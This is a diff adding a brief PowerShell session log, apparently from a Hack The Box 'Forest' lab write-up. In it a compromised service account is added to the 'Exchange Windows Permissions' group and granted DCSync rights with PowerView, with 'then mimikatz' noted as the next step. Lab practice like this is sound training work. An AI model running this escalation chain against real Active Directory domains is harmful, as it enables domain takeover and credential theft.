@@ -1,0 +1,11 @@
+PS htb\svc-alfresco@FOREST Documents> Import-Module .\PowerView.ps1
+PS htb\svc-alfresco@FOREST Documents> $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -force
+PS htb\svc-alfresco@FOREST Documents> $Cred = New-Object System.Management.Automation.PSCredential('svc-alfresco', $SecPassword)
+PS htb\svc-alfresco@FOREST Documents> net group "exchange windows permissions" /add svc-alfresco
+The command completed successfully.
+
+PS htb\svc-alfresco@FOREST Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity svc-alfresco -Rights DCSync
+
+then mimikatz
+
+
